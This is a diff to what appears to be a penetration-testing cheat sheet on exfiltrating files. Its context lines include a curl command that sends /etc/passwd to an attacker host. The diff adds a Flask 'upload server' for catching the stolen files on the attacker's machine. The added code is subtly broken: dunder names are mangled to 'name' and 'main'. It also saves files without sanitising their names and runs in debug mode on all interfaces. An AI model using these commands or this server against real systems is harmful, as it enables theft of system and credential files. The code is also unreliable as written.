@@ -146,6 +146,70 @@ $ curl -X POST https://<IP_Attacker>/upload -F 'files=@/etc/passwd'
 ------------------------------------------------------------------------
 - Setup python webserver on victim machine and use curl or wget to download the files to our attacker machine -
 ````
+````python
+# Server Flask to receive the file
+from flask import Flask, request, jsonify
+import os
+
+app = Flask(name)
+
+UPLOAD_FOLDER = './uploads'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    try:
+        # Verifica se há ficheiros no request
+        if 'file' not in request.files:
+            return jsonify({'error': 'No file part in request'}), 400
+
+        file = request.files['file']
+
+        if file.filename == '':
+            return jsonify({'error': 'No file selected'}), 400
+
+        filepath = os.path.join(UPLOAD_FOLDER, file.filename)
+        file.save(filepath)
+
+        file_size = os.path.getsize(filepath)
+
+        print(f"[+] File received: {file.filename} ({file_size} bytes)")
+
+        return jsonify({
+            'success': True,
+            'filename': file.filename,
+            'size': file_size,
+            'path': filepath
+        }), 200
+
+    except Exception as e:
+        print(f"[-] Error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/', methods=['GET'])
+def index():
+    files = os.listdir(UPLOAD_FOLDER) if os.path.exists(UPLOAD_FOLDER) else []
+    return f"""
+    <html>
+    <body>
+        <h1>File Upload Server</h1>
+        <p>Upload endpoint: POST /upload</p>
+        <p>Files received: {len(files)}</p>
+        <ul>
+            {''.join([f'<li>{f}</li>' for f in files])}
+        </ul>
+    </body>
+    </html>
+    """
+
+if name == 'main':
+    print("[] Starting Flask upload server...")
+    print(f"[] Upload folder: {os.path.abspath(UPLOAD_FOLDER)}")
+    print("[] Listening on http://0.0.0.0:8888")
+    print("[] Upload endpoint: POST /upload")
+    app.run(host='0.0.0.0', port=8888, debug=True)
+````
+
 
 **SSH**
 ````
